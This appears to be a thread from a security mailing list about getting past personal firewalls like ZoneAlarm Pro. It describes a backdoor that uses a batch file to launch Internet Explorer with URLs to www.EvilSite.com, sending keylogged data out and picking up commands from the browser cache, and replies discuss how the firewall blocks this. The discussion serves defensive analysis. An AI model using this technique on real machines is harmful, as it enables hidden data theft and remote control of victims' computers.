Just to correct my last statement in my previous reply - 
>> There is another way by which an evil-code can get this run is by moving
the batch file to system startup 
>> or pointing it in the registry to run on system boot but this will be a
warning signal for the user.  

Even ZA Pro blocks and warns the user if some program (evil or trusted) is
trying to become a system startup program. Sorry for that mistake had tooo
much with Paul & Zone Labs ;-)

Yes Indeed !! As long as you are trying out this concept with the current
versions of ZA Pro and few prior versions... The beauty of ZA Pro is, it
even traps inter-process communications and windows messaging between two
different processes and prompts for user's permission. This goes ahead of
normal desktop based fw with more defense methods than just protecting a PC
from network based attacks.

To execute the batch file, the evil-program needs to trigger the execution
of the batch file and this is easily prevented by ZA Pro.. Normally the
evil-code will use the api shell() which is prevented. 

However, this will work if the users click on the batch file or run it via
Start->Run but this is not the way a evil-code works. In this scenario 
Start->ZA
Pro clearly distinguishes between user interventions and a program
communicating with another program. 


There is another way by which an evil-code can get this run is by moving the
batch file to system startup or pointing it in the registry to run on system
boot but this will be a warning signal for the user.

hello list,
Lately 'Debasis Mohanty' was refreshing some old issues. Anyways... is
Bypassing Personal Firewall & let an internal (evil) application communicate
with the external world,  the hard. I mean... OK try this........ Lets.. me
give you a simple concept. I'll call it 'passive communication' ( in lack of
better world)

say... a backdoor want to communicate to its server... It can do is,.... use
a trusted internal application to do the job. Suppose; it creates a batch
file run the batch file  (evil.bat) & executes this command

....Internet Explorer\> iexplore.exe
www.EvilSite.com/?cmd=submit&f=___KeyLog__

the batch file will get executed & Internet explorer will happily send the
DATA. This trick can be used to send OUTPUT as well as get input... without
trigering the firewall.

To get input; the backdoor can do is... say, run similar BAT script:

....Internet Explorer\> iexplore.exe www.EvilSite.com/?cmd=ANY_NEW_COMMANDS

well... the history of the page
www.EvilSite.com/?cmd=ANY_NEW_COMMANDS will be there in the IE cache... Then
the backdoor can do is... RUN a string based 'GREP' in the IE cache & see if
there is any new job to acomplish.

just a rough theory... but ya its POSSIBLE; to let a internal backdoor have
I/O with its server without trigering the firewall alert....

---------------
yap it does work... using the same trick can't the backdoor happily
communicate with its server using the trick

Zeroth law of security: The possibility of poking a system from lower
privilege is zero unless & until there is possibility of direct, indirect or
